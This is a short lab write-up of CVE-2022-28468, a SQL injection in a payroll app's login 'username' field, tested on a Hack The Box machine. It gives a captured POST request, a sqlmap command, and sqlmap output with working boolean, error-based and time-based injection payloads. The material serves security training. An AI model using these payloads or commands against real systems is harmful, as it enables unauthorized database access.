# CVE-2022-28468 - Payroll Management System SQL Injection

SQL Injection on the `username` parameter.

## Enumeration

![Payroll_Management_System](images/Payroll_Management_System.png)

## Exploitation

![Ajax Login](images/Payroll_Management_System_ajax_login_burp.png)

```bash
$ cat ajax-login.req 
POST /ajax.php?action=login HTTP/1.1
Host: preprod-payroll.trick.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 27
Origin: http://preprod-payroll.trick.htb
Connection: close
Referer: http://preprod-payroll.trick.htb/login.php
Cookie: PHPSESSID=3e252925j9elk56pjkdt3sfqv4

username=kali&password=kali
```

```bash
$ sqlmap -r ajax-login.req --dbms=mysql --data='username=1' --level 5 --risk 3
...
---
Parameter: username (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (NOT)
    Payload: username=kali' OR NOT 8818=8818-- UmdJ&password=kali123

    Type: error-based
    Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: username=kali' OR (SELECT 9429 FROM(SELECT COUNT(*),CONCAT(0x71706a7671,(SELECT (ELT(9429=9429,1))),0x71787a7071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- nHZN&password=kali123

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=kali' AND (SELECT 3796 FROM (SELECT(SLEEP(5)))HacW)-- msGw&password=kali123
---
[08:17:07] [INFO] testing MySQL
[08:17:07] [INFO] confirming MySQL
[08:17:07] [INFO] the back-end DBMS is MySQL
web application technology: Nginx 1.14.2
back-end DBMS: MySQL >= 5.0.0 (MariaDB fork)
...
```

## Links

- [NIST - CVE-2022-28468](https://nvd.nist.gov/vuln/detail/CVE-2022-28468)
- [GitHub - nu11secur1ty - CVE-2022-28468](https://github.com/nu11secur1ty/CVE-nu11secur1ty/tree/main/vendors/oretnom23/2022/Payroll-Management-System)
- [HTB Trick - good lab machine](https://app.hackthebox.com/machines/477)
